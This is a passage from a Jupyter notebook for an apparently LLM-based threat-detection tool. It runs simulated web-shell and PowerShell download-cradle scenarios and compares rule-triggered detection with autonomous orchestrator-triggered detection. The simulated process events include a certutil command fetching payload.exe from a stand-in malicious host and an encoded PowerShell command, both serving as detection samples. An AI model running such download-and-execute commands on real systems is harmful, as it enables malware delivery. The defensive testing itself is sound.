ORCH_NAME   = name_b
# ────────────────────────────────────────────────────────────────────────────

ORCH_SESSION = datetime.now().strftime("%Y%m%d_%H%M%S") + "_orch"
orch_report  = None

def on_orch_trigger(snapshot: dict, all_events: list, orchestrator_reasoning: str = ""):
    global orch_report
    orch_report = run_scenario(
        ORCH_NAME, snapshot, all_events,
        session_id=ORCH_SESSION,
        orchestrator_reasoning=orchestrator_reasoning,
    )

print(f"Running {ORCH_NAME} in orchestrator mode...")
fired = watch_with_orchestrator(ORCH_NAME, ORCH_EVENTS, on_orch_trigger, delay=0.0)

if not fired:
    e0 = ORCH_EVENTS[0]
    trigger = {"pid": e0["pid"], "name": e0["name"],
               "parent_pid": e0.get("parent_pid"), "parent_name": e0.get("parent_name"),
               "cmdline": e0.get("cmdline", "")}
    orch_report = run_scenario(ORCH_NAME, trigger, ORCH_EVENTS, session_id=ORCH_SESSION)

Running Web Shell Activity in orchestrator mode...
[orchestrator] Adaptive sensing: Web Shell Activity
[orchestrator] No pre-specified rules — reasoning from general knowledge

  [07:21:27] w3wp.exe (pid 5678)  ←  svchost.exe
  [07:21:28] cmd.exe (pid 6543)  ←  w3wp.exe
  [07:21:30] cmd.exe (pid 6544)  ←  w3wp.exe
  [07:21:32] cmd.exe (pid 6545)  ←  w3wp.exe
  [07:21:34] cmd.exe (pid 6546)  ←  w3wp.exe

[orchestrator] *** INVESTIGATE ***
[orchestrator] w3wp.exe (IIS application pool process) is spawning multiple cmd.exe instances in rapid succession executing reconnaissance commands (whoami, net user, ipconfig, domain admin enumeration). This pattern is highly indicative of post-exploitation activity or web application compromise, as legitimate IIS applications rarely need to execute system reconnaissance commands directly. The sequence of commands suggests an attacker gathering environment and privilege information after gaining code execution through the web server.
[orchestrator] In

In [28]:
print(orch_report)

CYBER-SENSE THREAT REPORT
Timestamp: 2026-05-26 07:25:19
Trigger:   cmd.exe spawned from w3wp.exe

ORCHESTRATOR DECISION
---------------------
Decision:   INVESTIGATE
Reasoning:  w3wp.exe (IIS application pool process) is spawning multiple cmd.exe instances in rapid succession executing reconnaissance commands (whoami, net user, ipconfig, domain admin enumeration). This pattern is highly indicative of post-exploitation activity or web application compromise, as legitimate IIS applications rarely need to execute system reconnaissance commands directly. The sequence of commands suggests an attacker gathering environment and privilege information after gaining code execution through the web server.

Initiated by: autonomous orchestrator reasoning (no pre-specified rules)
Human involvement: none at initiation, analysis, or detection stage

PROCESS SEQUENCE
----------------
[07:21:27] w3wp.exe (pid 5678) spawned by svchost.exe (pid 4567)
           cmdline: c:\windows\system32\inetsrv\w3wp.

---
## 9. Side-by-side: Category 3 vs Category 4

Run the same scenario through both modes. The pipeline output (analysis,
classification, recommended actions) is identical in both cases.
The only difference is the initiation trail — who or what decided to investigate.

> **LLM calls:** two full pipeline runs. Expect 4–8 minutes.

In [29]:
from cyber_sense.sensor.monitor import watch_simulated, watch_with_orchestrator

COMPARE_EVENTS = events_a
COMPARE_NAME   = name_a
SID = datetime.now().strftime("%Y%m%d_%H%M%S")

# Category 3 run
report_cat3 = None
def _on_cat3(snapshot: dict, all_events: list):
    global report_cat3
    report_cat3 = run_scenario(COMPARE_NAME, snapshot, all_events,
                               session_id=SID + "_cat3")

print("Running Category 3 (rules)...")
watch_simulated(COMPARE_NAME, COMPARE_EVENTS, _on_cat3, delay=0.0)

# Category 4 run
report_cat4 = None
def _on_cat4(snapshot: dict, all_events: list, orchestrator_reasoning: str = ""):
    global report_cat4
    report_cat4 = run_scenario(COMPARE_NAME, snapshot, all_events,
                               session_id=SID + "_cat4",
                               orchestrator_reasoning=orchestrator_reasoning)

print("Running Category 4 (orchestrator)...")
watch_with_orchestrator(COMPARE_NAME, COMPARE_EVENTS, _on_cat4, delay=0.0)

Running Category 3 (rules)...
[sensor] Simulated feed: PowerShell Download Cradle
[sensor] Watching 5 events...

  [07:21:27] explorer.exe (pid 1234)  ←  —
  [07:21:28] cmd.exe (pid 5432)  ←  explorer.exe
  [07:21:29] powershell.exe (pid 6789)  ←  cmd.exe

[sensor] *** TRIGGER: powershell.exe (pid 6789) matched a signature ***
[sensor] Running LLM triage...
[sensor] [TRIAGE] FIRE — Encoded PowerShell command from cmd.exe spawning certutil for remote payload download indicates a classic malware delivery chain with obfuscation and file staging behavior.
[sensor] Environment signal confirmed — initiating pipeline...

  [1/5] trigger_received  — powershell.exe (pid 6789) <- cmd.exe
  [2/5] monitor_activity  — 5 events collected
  [3/5] analyze_sequence  — invoking ReAct agent...
  [Anthropic API call] model=claude-sonnet-4-6  messages=2  ts=07:25:20
  [Anthropic API call] model=claude-sonnet-4-6  messages=6  ts=07:25:30
  [Anthropic API call] model=claude-sonnet-4-6  messages=10  ts=07:25:

True

In [30]:
# Show the first 25 lines of each report — the initiation headers differ;
# the PROCESS SEQUENCE / THREAT CLASSIFICATION / ANALYSIS sections are the same
def head(report, n=25):
    return "\n".join((report or "(no report)").splitlines()[:n])

print("=" * 62)
print("CATEGORY 3  —  initiated by rule match")
print("=" * 62)
print(head(report_cat3))

print()
print("=" * 62)
print("CATEGORY 4  —  initiated by autonomous orchestrator reasoning")
print("=" * 62)
print(head(report_cat4))

CATEGORY 3  —  initiated by rule match
CYBER-SENSE THREAT REPORT
Timestamp: 2026-05-26 07:26:32
Trigger:   powershell.exe spawned from cmd.exe

Initiated by: environment signal (process monitor)
Human involvement: none at detection or analysis stage

PROCESS SEQUENCE
----------------
[07:21:27] explorer.exe (pid 1234) spawned by — (pid —)
[07:21:28] cmd.exe (pid 5432) spawned by explorer.exe (pid 1234)
           cmdline: cmd.exe /c
[07:21:29] powershell.exe (pid 6789) spawned by cmd.exe (pid 5432)
           cmdline: powershell.exe -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
[07:21:31] certutil.exe (pid 7890) spawned by powershell.exe (pid 6789)
           cmdline: certutil.exe -urlcache -f http://malicious.example.com/payload.exe C:\Users\Public\payload.exe
[07:21:33] certutil.exe (pid 7890) — Outbound TCP connection to 203.0.113.99:80 (malicious.example.com)

THREAT CLASSIFICATION
---------------------
Level:      CRITICAL
Confidence: 0.96
Technique:  T1059.001 - Com

In [31]:
# The architectural claim in one print statement
if report_cat3 and report_cat4:
    lines3 = report_cat3.splitlines()
    lines4 = report_cat4.splitlines()
    # Find the initiation lines
    for line in lines3:
        if "Initiated by" in line or "Human involvement" in line:
            print(f"Cat 3: {line.strip()}")
    for line in lines4:
        if "Initiated by" in line or "Human involvement" in line or "ORCHESTRATOR" in line:
            print(f"Cat 4: {line.strip()}")

Cat 3: Initiated by: environment signal (process monitor)
Cat 3: Human involvement: none at detection or analysis stage
Cat 4: ORCHESTRATOR DECISION
Cat 4: Initiated by: autonomous orchestrator reasoning (no pre-specified rules)
Cat 4: Human involvement: none at initiation, analysis, or detection stage
